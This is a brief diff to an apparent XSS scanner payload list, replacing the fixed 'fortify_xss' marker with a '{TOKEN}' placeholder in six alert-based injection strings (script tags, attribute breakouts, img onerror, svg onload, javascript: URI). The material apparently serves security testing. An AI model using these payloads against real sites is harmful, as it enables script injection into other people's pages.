@@ -1,6 +1,6 @@
-<script>alert('fortify_xss')</script>
-"><script>alert('fortify_xss')</script>
-<img src=x onerror=alert('fortify_xss')>
-<svg onload=alert('fortify_xss')>
-'><svg/onload=alert('fortify_xss')>
-javascript:alert('fortify_xss')
+<script>alert('{TOKEN}')</script>
+"><script>alert('{TOKEN}')</script>
+<img src=x onerror=alert('{TOKEN}')>
+<svg onload=alert('{TOKEN}')>
+'><svg/onload=alert('{TOKEN}')>
+javascript:alert('{TOKEN}')
